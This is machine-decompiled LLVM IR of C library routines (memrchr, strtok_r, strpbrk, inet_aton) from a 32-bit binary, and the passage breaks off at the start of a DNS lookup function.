define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8055959 = urem i32 %arg2, 256
  %v4_8055965 = sext i8 %arg1 to i32
  %v2_8055969 = add i32 %v4_8055965, %arg3
  %v1_805597b7 = icmp eq i32 %arg3, 0
  br i1 %v1_805597b7, label %dec_label_pc_8055983, label %dec_label_pc_805597f

dec_label_pc_805596d:                             ; preds = %dec_label_pc_805597f
  %v1_805596d = add i32 %v0_805596d, -1
  %v5_805596e = load i32, i32* @edx, align 4
  %v6_805596e = and i32 %v5_805596e, -256
  %v7_805596e = or i32 %v6_805596e, %v4_8055959
  store i32 %v7_805596e, i32* @edx, align 4
  %v1_8055972 = inttoptr i32 %v1_805596d to i8*
  %v2_8055972 = load i8, i8* %v1_8055972, align 1
  %v15_8055972 = icmp eq i8 %v2_8055972, %tmp
  br i1 %v15_8055972, label %dec_label_pc_8055a00, label %dec_label_pc_805597a

dec_label_pc_805597a:                             ; preds = %dec_label_pc_805596d
  %v1_805597a = add i32 %v0_805597a, -1
  %v8_805597a = icmp eq i32 %v1_805597a, 0
  br i1 %v8_805597a, label %dec_label_pc_8055983, label %dec_label_pc_805597f

dec_label_pc_805597f:                             ; preds = %entry, %dec_label_pc_805597a
  %v0_805597a = phi i32 [ %v1_805597a, %dec_label_pc_805597a ], [ %arg3, %entry ]
  %v0_805596d = phi i32 [ %v1_805596d, %dec_label_pc_805597a ], [ %v2_8055969, %entry ]
  %v2_805597f = urem i32 %v0_805596d, 4
  %v3_805597f = icmp eq i32 %v2_805597f, 0
  %v1_8055981 = icmp eq i1 %v3_805597f, false
  br i1 %v1_8055981, label %dec_label_pc_805596d, label %dec_label_pc_8055983

dec_label_pc_8055983:                             ; preds = %dec_label_pc_805597a, %dec_label_pc_805597f, %entry
  %v0_80559e6.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_805597a ], [ %v0_805597a, %dec_label_pc_805597f ]
  %v0_8055988 = phi i32 [ %v2_8055969, %entry ], [ %v1_805596d, %dec_label_pc_805597a ], [ %v0_805596d, %dec_label_pc_805597f ]
  store i32 %v0_8055988, i32* @ecx, align 4
  %v2_805598c = mul nuw nsw i32 %v4_8055959, 256
  %v2_805598f = or i32 %v2_805598c, %v4_8055959
  %v2_8055993 = mul i32 %v2_805598f, 65536
  %v2_8055996 = or i32 %v2_8055993, %v2_805598f
  %v6_80559e950 = icmp ugt i32 %v0_80559e6.pr, 3
  br i1 %v6_80559e950, label %dec_label_pc_805599a, label %dec_label_pc_80559eb

dec_label_pc_805599a:                             ; preds = %dec_label_pc_8055983, %dec_label_pc_80559e3
  %v0_80559e352 = phi i32 [ %v1_80559e3, %dec_label_pc_80559e3 ], [ %v0_80559e6.pr, %dec_label_pc_8055983 ]
  %v0_805599a51 = phi i32 [ %v1_805599a, %dec_label_pc_80559e3 ], [ %v0_8055988, %dec_label_pc_8055983 ]
  %v1_805599a = add i32 %v0_805599a51, -4
  store i32 %v1_805599a, i32* @ecx, align 4
  %v2_805599f = inttoptr i32 %v1_805599a to i32*
  %v3_805599f = load i32, i32* %v2_805599f, align 4
  %v4_805599f = xor i32 %v3_805599f, %v2_8055996
  %v1_80559a1 = add i32 %v4_805599f, 2130640639
  %v1_80559a7 = sub i32 -1, %v4_805599f
  %v2_80559a9 = xor i32 %v1_80559a1, %v1_80559a7
  %v1_80559ab = and i32 %v2_80559a9, -2130640640
  %v2_80559ab = icmp eq i32 %v1_80559ab, 0
  br i1 %v2_80559ab, label %dec_label_pc_80559e3, label %dec_label_pc_80559b3

dec_label_pc_80559b3:                             ; preds = %dec_label_pc_805599a
  %v7_80559b3 = or i32 %v1_80559ab, %v4_8055959
  %v1_80559b7 = add i32 %v0_805599a51, -1
  %v2_80559ba = inttoptr i32 %v1_80559b7 to i8*
  %v3_80559ba = load i8, i8* %v2_80559ba, align 1
  %v16_80559ba = icmp eq i8 %v3_80559ba, %tmp
  br i1 %v16_80559ba, label %dec_label_pc_8055a00, label %dec_label_pc_80559bf

dec_label_pc_80559bf:                             ; preds = %dec_label_pc_80559b3
  %v1_80559c3 = add i32 %v0_805599a51, -2
  %v2_80559c6 = inttoptr i32 %v1_80559c3 to i8*
  %v3_80559c6 = load i8, i8* %v2_80559c6, align 1
  %v16_80559c6 = icmp eq i8 %v3_80559c6, %tmp
  br i1 %v16_80559c6, label %dec_label_pc_8055a00, label %dec_label_pc_80559cb

dec_label_pc_80559cb:                             ; preds = %dec_label_pc_80559bf
  %v1_80559cf = add i32 %v0_805599a51, -3
  %v2_80559d2 = inttoptr i32 %v1_80559cf to i8*
  %v3_80559d2 = load i8, i8* %v2_80559d2, align 1
  %v16_80559d2 = icmp eq i8 %v3_80559d2, %tmp
  br i1 %v16_80559d2, label %dec_label_pc_8055a00, label %dec_label_pc_80559d7

dec_label_pc_80559d7:                             ; preds = %dec_label_pc_80559cb
  %v1_80559db = inttoptr i32 %v1_805599a to i8*
  %v2_80559db = load i8, i8* %v1_80559db, align 1
  %v15_80559db = icmp eq i8 %v2_80559db, %tmp
  %v1_80559dd = icmp eq i1 %v15_80559db, false
  br i1 %v1_80559dd, label %dec_label_pc_80559e3, label %dec_label_pc_80559df

dec_label_pc_80559df:                             ; preds = %dec_label_pc_80559d7
  br label %dec_label_pc_8055a00

dec_label_pc_80559e3:                             ; preds = %dec_label_pc_80559d7, %dec_label_pc_805599a
  %v5_80559f027 = phi i32 [ %v7_80559b3, %dec_label_pc_80559d7 ], [ 0, %dec_label_pc_805599a ]
  %v1_80559e3 = add i32 %v0_80559e352, -4
  %v6_80559e9 = icmp ugt i32 %v1_80559e3, 3
  br i1 %v6_80559e9, label %dec_label_pc_805599a, label %dec_label_pc_80559eb

dec_label_pc_80559eb:                             ; preds = %dec_label_pc_80559e3, %dec_label_pc_8055983
  %v5_80559f026.lcssa = phi i32 [ %v4_8055959, %dec_label_pc_8055983 ], [ %v5_80559f027, %dec_label_pc_80559e3 ]
  %v0_805599a.lcssa = phi i32 [ %v0_8055988, %dec_label_pc_8055983 ], [ %v1_805599a, %dec_label_pc_80559e3 ]
  %v0_80559e3.lcssa = phi i32 [ %v0_80559e6.pr, %dec_label_pc_8055983 ], [ %v1_80559e3, %dec_label_pc_80559e3 ]
  br label %dec_label_pc_80559f8

dec_label_pc_80559ef:                             ; preds = %dec_label_pc_80559f8
  %v1_80559f8 = add i32 %v0_80559f8, -1
  %v1_80559ef = add i32 %v0_80559ef, -1
  %v6_80559f0 = and i32 %v5_80559f0, -256
  %v7_80559f0 = or i32 %v6_80559f0, %v4_8055959
  %v1_80559f4 = inttoptr i32 %v1_80559ef to i8*
  %v2_80559f4 = load i8, i8* %v1_80559f4, align 1
  %v15_80559f4 = icmp eq i8 %v2_80559f4, %tmp
  br i1 %v15_80559f4, label %dec_label_pc_8055a00, label %dec_label_pc_80559f8

dec_label_pc_80559f8:                             ; preds = %dec_label_pc_80559ef, %dec_label_pc_80559eb
  %v5_80559f0 = phi i32 [ %v7_80559f0, %dec_label_pc_80559ef ], [ %v5_80559f026.lcssa, %dec_label_pc_80559eb ]
  %v0_80559ef = phi i32 [ %v1_80559ef, %dec_label_pc_80559ef ], [ %v0_805599a.lcssa, %dec_label_pc_80559eb ]
  %v0_80559f8 = phi i32 [ %v1_80559f8, %dec_label_pc_80559ef ], [ %v0_80559e3.lcssa, %dec_label_pc_80559eb ]
  %v10_80559f9 = icmp eq i32 %v0_80559f8, 0
  %v1_80559fc = icmp eq i1 %v10_80559f9, false
  br i1 %v1_80559fc, label %dec_label_pc_80559ef, label %dec_label_pc_80559fe

dec_label_pc_80559fe:                             ; preds = %dec_label_pc_80559f8
  br label %dec_label_pc_8055a00

dec_label_pc_8055a00:                             ; preds = %dec_label_pc_805596d, %dec_label_pc_80559cb, %dec_label_pc_80559bf, %dec_label_pc_80559b3, %dec_label_pc_80559ef, %dec_label_pc_80559df, %dec_label_pc_80559fe
  %v0_8055a03 = phi i32 [ %v1_805599a, %dec_label_pc_80559df ], [ 0, %dec_label_pc_80559fe ], [ %v1_80559ef, %dec_label_pc_80559ef ], [ %v1_80559cf, %dec_label_pc_80559cb ], [ %v1_80559c3, %dec_label_pc_80559bf ], [ %v1_80559b7, %dec_label_pc_80559b3 ], [ %v1_805596d, %dec_label_pc_805596d ]
  ret i32 %v0_8055a03

; uselistorder directives
  uselistorder i32 %v0_80559f8, { 1, 0 }
  uselistorder i32 %v1_80559e3, { 0, 2, 1 }
  uselistorder i32 %v1_805599a, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805599a51, { 3, 2, 1, 0 }
  uselistorder i32 %v2_805598f, { 1, 0 }
  uselistorder i32 %v0_805596d, { 1, 0, 2 }
  uselistorder i32 %v2_8055969, { 1, 0 }
  uselistorder i32 %v4_8055959, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 7, 0, 16, 17, 1, 15, 19, 14, 20, 3, 5, 4, 21, 8, 9, 10, 18, 11, 12, 6, 13 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055a00, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805599a, { 1, 0 }
  uselistorder label %dec_label_pc_8055983, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805597f, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055a04 = load i32, i32* @edi, align 4
  %v0_8055a05 = load i32, i32* @esi, align 4
  %v0_8055a06 = load i32, i32* @ebx, align 4
  store i32 %v0_8055a06, i32* %stack_var_-12, align 4
  %v4_8055a07 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055a07, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8055a13 = icmp eq i8* %arg1, null
  %v1_8055a15 = icmp eq i1 %v1_8055a13, false
  br i1 %v1_8055a15, label %dec_label_pc_8055a19, label %dec_label_pc_8055a17

dec_label_pc_8055a17:                             ; preds = %entry
  %v1_8055a17 = inttoptr i32 %arg3 to i32*
  %v2_8055a17 = load i32, i32* %v1_8055a17, align 4
  store i32 %v2_8055a17, i32* @ebx, align 4
  br label %dec_label_pc_8055a19

dec_label_pc_8055a19:                             ; preds = %entry, %dec_label_pc_8055a17
  %v0_8055a1c = phi i32 [ %v4_8055a07, %entry ], [ %v2_8055a17, %dec_label_pc_8055a17 ]
  %v0_8055a19 = load i32, i32* @ecx, align 4
  %v5_8055a1c = inttoptr i32 %v0_8055a1c to i8*
  %v8_8055a1d = call i32 @__GI_strspn(i8* %v5_8055a1c, i32 %arg2, i32 %v0_8055a19, i32 %v0_8055a19)
  store i32 %v8_8055a1d, i32* %eax.global-to-local, align 4
  %v0_8055a25 = load i32, i32* @ebx, align 4
  %v2_8055a25 = add i32 %v0_8055a25, %v8_8055a1d
  store i32 %v2_8055a25, i32* @ebx, align 4
  %v1_8055a27 = inttoptr i32 %v2_8055a25 to i8*
  %v2_8055a27 = load i8, i8* %v1_8055a27, align 1
  %v3_8055a27 = icmp eq i8 %v2_8055a27, 0
  %v1_8055a2a = icmp eq i1 %v3_8055a27, false
  br i1 %v1_8055a2a, label %dec_label_pc_8055a32, label %dec_label_pc_8055a2c

dec_label_pc_8055a2c:                             ; preds = %dec_label_pc_8055a19
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8055a2e = load i32, i32* @esi, align 4
  %v2_8055a2e = inttoptr i32 %v1_8055a2e to i32*
  store i32 %v2_8055a25, i32* %v2_8055a2e, align 4
  %v0_8055a5c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055a59

dec_label_pc_8055a32:                             ; preds = %dec_label_pc_8055a19
  %v0_8055a32 = load i32, i32* @edx, align 4
  %v0_8055a34 = load i32, i32* @edi, align 4
  %v8_8055a36 = call i32 @__GI_strpbrk(i8* %v1_8055a27, i32 %v0_8055a34, i32 %v0_8055a32, i32 %v0_8055a32)
  store i32 %v8_8055a36, i32* %eax.global-to-local, align 4
  %v2_8055a3e = icmp eq i32 %v8_8055a36, 0
  %v1_8055a40 = icmp eq i1 %v2_8055a3e, false
  br i1 %v1_8055a40, label %dec_label_pc_8055a51, label %dec_label_pc_8055a42

dec_label_pc_8055a42:                             ; preds = %dec_label_pc_8055a32
  %v0_8055a46 = load i32, i32* @ebx, align 4
  %v5_8055a46 = inttoptr i32 %v0_8055a46 to i8*
  %v8_8055a47 = call i32 @rawmemchr(i8* %v5_8055a46, i32 0, i32 %v8_8055a36, i32 %v8_8055a36)
  br label %dec_label_pc_8055a55

dec_label_pc_8055a51:                             ; preds = %dec_label_pc_8055a32
  %v9_8055a36 = inttoptr i32 %v8_8055a36 to i8*
  store i8 0, i8* %v9_8055a36, align 1
  %v2_8055a54 = add i32 %v8_8055a36, 1
  br label %dec_label_pc_8055a55

dec_label_pc_8055a55:                             ; preds = %dec_label_pc_8055a42, %dec_label_pc_8055a51
  %storemerge = phi i32 [ %v2_8055a54, %dec_label_pc_8055a51 ], [ %v8_8055a47, %dec_label_pc_8055a42 ]
  %v0_8055a55 = phi i32 [ %v2_8055a54, %dec_label_pc_8055a51 ], [ %v8_8055a47, %dec_label_pc_8055a42 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8055a55 = load i32, i32* @esi, align 4
  %v2_8055a55 = inttoptr i32 %v1_8055a55 to i32*
  store i32 %v0_8055a55, i32* %v2_8055a55, align 4
  %v0_8055a57 = load i32, i32* @ebx, align 4
  store i32 %v0_8055a57, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055a59

dec_label_pc_8055a59:                             ; preds = %dec_label_pc_8055a2c, %dec_label_pc_8055a55
  %v0_8055a5c = phi i32 [ %v0_8055a5c.pre, %dec_label_pc_8055a2c ], [ %v0_8055a57, %dec_label_pc_8055a55 ]
  %v2_8055a59 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055a59, i32* @ebx, align 4
  store i32 %v0_8055a05, i32* @esi, align 4
  store i32 %v0_8055a04, i32* @edi, align 4
  ret i32 %v0_8055a5c

; uselistorder directives
  uselistorder i32 %v8_8055a36, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055a59, { 1, 0 }
  uselistorder label %dec_label_pc_8055a55, { 1, 0 }
  uselistorder label %dec_label_pc_8055a19, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055a61 = load i32, i32* @ebx, align 4
  %v2_8055a7825 = load i8, i8* %arg1, align 1
  %v4_8055a7a29 = icmp eq i8 %v2_8055a7825, 0
  br i1 %v4_8055a7a29, label %dec_label_pc_8055a82, label %dec_label_pc_8055a7e.lr.ph

dec_label_pc_8055a7e.lr.ph:                       ; preds = %entry
  %v3_8055a7826 = zext i8 %v2_8055a7825 to i32
  %v5_8055a7827 = and i32 %v0_8055a61, -256
  %v6_8055a7828 = or i32 %v3_8055a7826, %v5_8055a7827
  %v4_8055a66 = ptrtoint i8* %arg1 to i32
  %v1_8055a7114 = inttoptr i32 %arg2 to i8*
  %v4_8055a71.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8055a7e

dec_label_pc_8055a6c:                             ; preds = %dec_label_pc_8055a7e, %dec_label_pc_8055a70
  %v6_8055a7123 = phi i32 [ %v6_8055a71, %dec_label_pc_8055a70 ], [ %v6_8055a7118, %dec_label_pc_8055a7e ]
  %v2_8055a7122 = phi i8 [ %v2_8055a71, %dec_label_pc_8055a70 ], [ %v2_8055a7115, %dec_label_pc_8055a7e ]
  %v0_8055a7021 = phi i32 [ %v1_8055a70, %dec_label_pc_8055a70 ], [ %arg2, %dec_label_pc_8055a7e ]
  %v15_8055a6c = icmp eq i8 %v2_8055a7122, %v2_8055a7832
  br i1 %v15_8055a6c, label %dec_label_pc_8055a84, label %dec_label_pc_8055a70

dec_label_pc_8055a70:                             ; preds = %dec_label_pc_8055a6c
  %v1_8055a70 = add i32 %v0_8055a7021, 1
  store i32 %v1_8055a70, i32* @edx, align 4
  %v1_8055a71 = inttoptr i32 %v1_8055a70 to i8*
  %v2_8055a71 = load i8, i8* %v1_8055a71, align 1
  %v3_8055a71 = zext i8 %v2_8055a71 to i32
  %v5_8055a71 = and i32 %v6_8055a7123, -256
  %v6_8055a71 = or i32 %v3_8055a71, %v5_8055a71
  store i32 %v6_8055a71, i32* @ecx, align 4
  %v4_8055a73 = icmp eq i8 %v2_8055a71, 0
  %v1_8055a75 = icmp eq i1 %v4_8055a73, false
  br i1 %v1_8055a75, label %dec_label_pc_8055a6c, label %dec_label_pc_8055a77

dec_label_pc_8055a77:                             ; preds = %dec_label_pc_8055a70, %dec_label_pc_8055a7e
  %v4_8055a71.pre35 = phi i32 [ %v6_8055a7118, %dec_label_pc_8055a7e ], [ %v6_8055a71, %dec_label_pc_8055a70 ]
  %v1_8055a77 = add i32 %v0_8055a7730, 1
  %v1_8055a78 = inttoptr i32 %v1_8055a77 to i8*
  %v2_8055a78 = load i8, i8* %v1_8055a78, align 1
  %v3_8055a78 = zext i8 %v2_8055a78 to i32
  %v5_8055a78 = and i32 %v6_8055a7833, -256
  %v6_8055a78 = or i32 %v3_8055a78, %v5_8055a78
  %v4_8055a7a = icmp eq i8 %v2_8055a78, 0
  br i1 %v4_8055a7a, label %dec_label_pc_8055a82, label %dec_label_pc_8055a7e

dec_label_pc_8055a7e:                             ; preds = %dec_label_pc_8055a7e.lr.ph, %dec_label_pc_8055a77
  %v4_8055a71.pre = phi i32 [ %v4_8055a71.pre.pre, %dec_label_pc_8055a7e.lr.ph ], [ %v4_8055a71.pre35, %dec_label_pc_8055a77 ]
  %v6_8055a7833 = phi i32 [ %v6_8055a7828, %dec_label_pc_8055a7e.lr.ph ], [ %v6_8055a78, %dec_label_pc_8055a77 ]
  %v2_8055a7832 = phi i8 [ %v2_8055a7825, %dec_label_pc_8055a7e.lr.ph ], [ %v2_8055a78, %dec_label_pc_8055a77 ]
  %v0_8055a7730 = phi i32 [ %v4_8055a66, %dec_label_pc_8055a7e.lr.ph ], [ %v1_8055a77, %dec_label_pc_8055a77 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8055a7115 = load i8, i8* %v1_8055a7114, align 1
  %v3_8055a7116 = zext i8 %v2_8055a7115 to i32
  %v5_8055a7117 = and i32 %v4_8055a71.pre, -256
  %v6_8055a7118 = or i32 %v3_8055a7116, %v5_8055a7117
  store i32 %v6_8055a7118, i32* @ecx, align 4
  %v4_8055a7319 = icmp eq i8 %v2_8055a7115, 0
  %v1_8055a7520 = icmp eq i1 %v4_8055a7319, false
  br i1 %v1_8055a7520, label %dec_label_pc_8055a6c, label %dec_label_pc_8055a77

dec_label_pc_8055a82:                             ; preds = %dec_label_pc_8055a77, %entry
  br label %dec_label_pc_8055a84

dec_label_pc_8055a84:                             ; preds = %dec_label_pc_8055a6c, %dec_label_pc_8055a82
  %v0_8055a86 = phi i32 [ 0, %dec_label_pc_8055a82 ], [ %v0_8055a7730, %dec_label_pc_8055a6c ]
  store i32 %v0_8055a61, i32* @ebx, align 4
  ret i32 %v0_8055a86

; uselistorder directives
  uselistorder i32 %v6_8055a7118, { 2, 0, 1 }
  uselistorder i8 %v2_8055a7115, { 1, 2, 0 }
  uselistorder i32 %v1_8055a77, { 1, 0 }
  uselistorder i32 %v6_8055a71, { 1, 2, 0 }
  uselistorder i8 %v2_8055a71, { 1, 2, 0 }
  uselistorder i32 %v1_8055a70, { 2, 1, 0 }
  uselistorder i8 %v2_8055a7825, { 0, 2, 1 }
  uselistorder i32 %v0_8055a61, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055a84, { 1, 0 }
  uselistorder label %dec_label_pc_8055a7e, { 1, 0 }
  uselistorder label %dec_label_pc_8055a77, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8055a8f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055a8f, i32* @ecx, align 4
  %v1_8055a93 = icmp eq i8* %arg1, null
  br i1 %v1_8055a93, label %dec_label_pc_8055b14, label %dec_label_pc_8055a97

dec_label_pc_8055a97:                             ; preds = %entry
  %v0_8055aa5.pre = load i32, i32* @global_var_805b278, align 8
  br label %dec_label_pc_8055aa2

dec_label_pc_8055aa2:                             ; preds = %dec_label_pc_8055a97, %dec_label_pc_8055aeb
  %v2_8055aee35 = phi i32 [ 1, %dec_label_pc_8055a97 ], [ %v3_8055aee, %dec_label_pc_8055aeb ]
  %v0_8055aa234 = phi i32 [ %v4_8055a8f, %dec_label_pc_8055a97 ], [ %v0_8055aa23, %dec_label_pc_8055aeb ]
  %v0_8055b0933 = phi i32 [ 0, %dec_label_pc_8055a97 ], [ %v2_8055af1, %dec_label_pc_8055aeb ]
  %v1_8055aa2 = inttoptr i32 %v0_8055aa234 to i8*
  %v2_8055aa2 = load i8, i8* %v1_8055aa2, align 1
  %v3_8055aa2 = sext i8 %v2_8055aa2 to i32
  %v2_8055aab = mul nsw i32 %v3_8055aa2, 2
  %v3_8055aab = add i32 %v2_8055aab, %v0_8055aa5.pre
  %v4_8055aab = inttoptr i32 %v3_8055aab to i8*
  %v5_8055aab = load i8, i8* %v4_8055aab, align 1
  %v6_8055aab = and i8 %v5_8055aab, 8
  %v7_8055aab = icmp eq i8 %v6_8055aab, 0
  br i1 %v7_8055aab, label %dec_label_pc_8055b14, label %dec_label_pc_8055ab2

dec_label_pc_8055ab2:                             ; preds = %dec_label_pc_8055aa2
  %v4_8055ac6.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055ac6

dec_label_pc_8055ab6:                             ; preds = %dec_label_pc_8055ac6
  %v3_8055ab6 = mul i32 %v1_8055ab6, 10
  %v2_8055ab9 = add i32 %v3_8055ab6, -48
  %v3_8055ab9 = add i32 %v2_8055ab9, %v2_8055ac8
  %v1_8055abd = add i32 %v3_8055ab9, -255
  %v6_8055abd = sub i32 254, %v3_8055ab9
  %v7_8055abd = and i32 %v6_8055abd, %v3_8055ab9
  %v8_8055abd = icmp slt i32 %v7_8055abd, 0
  %v9_8055abd = icmp eq i32 %v1_8055abd, 0
  %v10_8055abd = icmp slt i32 %v1_8055abd, 0
  %v3_8055ac3 = icmp eq i1 %v10_8055abd, %v8_8055abd
  %v4_8055ac3 = icmp eq i1 %v9_8055abd, false
  %v5_8055ac3 = and i1 %v4_8055ac3, %v3_8055ac3
  br i1 %v5_8055ac3, label %dec_label_pc_8055b14, label %dec_label_pc_8055ac5

dec_label_pc_8055ac5:                             ; preds = %dec_label_pc_8055ab6
  %v1_8055ac5 = add i32 %v0_8055ac5, 1
  store i32 %v1_8055ac5, i32* @ecx, align 4
  br label %dec_label_pc_8055ac6

dec_label_pc_8055ac6:                             ; preds = %dec_label_pc_8055ab2, %dec_label_pc_8055ac5
  %v1_8055ab6 = phi i32 [ 0, %dec_label_pc_8055ab2 ], [ %v3_8055ab9, %dec_label_pc_8055ac5 ]
  %v4_8055ac6 = phi i32 [ %v4_8055ac6.pre, %dec_label_pc_8055ab2 ], [ %v6_8055ac6, %dec_label_pc_8055ac5 ]
  %v0_8055ac5 = phi i32 [ %v0_8055aa234, %dec_label_pc_8055ab2 ], [ %v1_8055ac5, %dec_label_pc_8055ac5 ]
  %v1_8055ac6 = inttoptr i32 %v0_8055ac5 to i8*
  %v2_8055ac6 = load i8, i8* %v1_8055ac6, align 1
  %v3_8055ac6 = zext i8 %v2_8055ac6 to i32
  %v5_8055ac6 = and i32 %v4_8055ac6, -256
  %v6_8055ac6 = or i32 %v3_8055ac6, %v5_8055ac6
  store i32 %v6_8055ac6, i32* @edx, align 4
  %v2_8055ac8 = sext i8 %v2_8055ac6 to i32
  %v2_8055acb = mul nsw i32 %v2_8055ac8, 2
  %v3_8055acb = add i32 %v2_8055acb, %v0_8055aa5.pre
  %v4_8055acb = inttoptr i32 %v3_8055acb to i16*
  %v5_8055acb = load i16, i16* %v4_8055acb, align 2
  %v2_8055ad0 = and i16 %v5_8055acb, 8
  %v3_8055ad0 = icmp eq i16 %v2_8055ad0, 0
  %v1_8055ad2 = icmp eq i1 %v3_8055ad0, false
  br i1 %v1_8055ad2, label %dec_label_pc_8055ab6, label %dec_label_pc_8055ad4

dec_label_pc_8055ad4:                             ; preds = %dec_label_pc_8055ac6
  %v8_8055ad4 = sub nsw i32 2, %v2_8055aee35
  %v9_8055ad4 = and i32 %v8_8055ad4, %v2_8055aee35
  %v10_8055ad4 = icmp slt i32 %v9_8055ad4, 0
  %v11_8055ad4 = icmp eq i32 %v2_8055aee35, 3
  %v12_8055ad4 = icmp slt i32 %v2_8055aee35, 3
  %v3_8055ad8 = icmp eq i1 %v12_8055ad4, %v10_8055ad4
  %v4_8055ad8 = icmp eq i1 %v11_8055ad4, false
  %v5_8055ad8 = and i1 %v4_8055ad8, %v3_8055ad8
  br i1 %v5_8055ad8, label %dec_label_pc_8055ae2, label %dec_label_pc_8055ada

dec_label_pc_8055ada:                             ; preds = %dec_label_pc_8055ad4
  %v10_8055ada = icmp eq i8 %v2_8055ac6, 46
  %v1_8055add = icmp eq i1 %v10_8055ada, false
  br i1 %v1_8055add, label %dec_label_pc_8055b14, label %dec_label_pc_8055adf

dec_label_pc_8055adf:                             ; preds = %dec_label_pc_8055ada
  %v1_8055adf = add i32 %v0_8055ac5, 1
  store i32 %v1_8055adf, i32* @ecx, align 4
  br label %dec_label_pc_8055aeb

dec_label_pc_8055ae2:                             ; preds = %dec_label_pc_8055ad4
  %v1_8055ae2 = add i32 %v0_8055ac5, 1
  store i32 %v1_8055ae2, i32* @ecx, align 4
  %v4_8055ae3 = icmp eq i8 %v2_8055ac6, 0
  br i1 %v4_8055ae3, label %dec_label_pc_8055aeb, label %dec_label_pc_8055ae7

dec_label_pc_8055ae7:                             ; preds = %dec_label_pc_8055ae2
  %v2_8055ae7 = and i16 %v5_8055acb, 32
  %v3_8055ae7 = icmp eq i16 %v2_8055ae7, 0
  br i1 %v3_8055ae7, label %dec_label_pc_8055b14, label %dec_label_pc_8055aeb

dec_label_pc_8055aeb:                             ; preds = %dec_label_pc_8055ae7, %dec_label_pc_8055ae2, %dec_label_pc_8055adf
  %v0_8055aa23 = phi i32 [ %v1_8055ae2, %dec_label_pc_8055ae7 ], [ %v1_8055ae2, %dec_label_pc_8055ae2 ], [ %v1_8055adf, %dec_label_pc_8055adf ]
  %v2_8055aeb = mul i32 %v0_8055b0933, 256
  %v3_8055aee = add nuw nsw i32 %v2_8055aee35, 1
  %v2_8055af1 = or i32 %v1_8055ab6, %v2_8055aeb
  %v7_8055af7 = icmp sgt i32 %v2_8055aee35, 3
  br i1 %v7_8055af7, label %dec_label_pc_8055af9, label %dec_label_pc_8055aa2

dec_label_pc_8055af9:                             ; preds = %dec_label_pc_8055aeb
  %v4_8055afe = icmp eq i32 %arg2, 0
  br i1 %v4_8055afe, label %dec_label_pc_8055b16, label %dec_label_pc_8055b05

dec_label_pc_8055b05:                             ; preds = %dec_label_pc_8055af9
  %v1_8055b09 = call i32 @llvm.bswap.i32(i32 %v2_8055af1)
  %v2_8055b0b = inttoptr i32 %arg2 to i32*
  store i32 %v1_8055b09, i32* %v2_8055b0b, align 4
  br label %dec_label_pc_8055b16

dec_label_pc_8055b14:                             ; preds = %dec_label_pc_8055ae7, %dec_label_pc_8055ada, %dec_label_pc_8055aa2, %dec_label_pc_8055ab6, %entry
  br label %dec_label_pc_8055b16

dec_label_pc_8055b16:                             ; preds = %dec_label_pc_8055af9, %dec_label_pc_8055b05, %dec_label_pc_8055b14
  %v0_8055b1b = phi i32 [ 1, %dec_label_pc_8055af9 ], [ 1, %dec_label_pc_8055b05 ], [ 0, %dec_label_pc_8055b14 ]
  ret i32 %v0_8055b1b

; uselistorder directives
  uselistorder i32 %v2_8055ac8, { 1, 0 }
  uselistorder i32 %v6_8055ac6, { 1, 0 }
  uselistorder i8 %v2_8055ac6, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8055ac5, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8055abd, { 1, 0 }
  uselistorder i32 %v3_8055ab9, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8055aa234, { 1, 0 }
  uselistorder i32 %v2_8055aee35, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055b16, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055b14, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8055ac6, { 1, 0 }
  uselistorder label %dec_label_pc_8055aa2, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
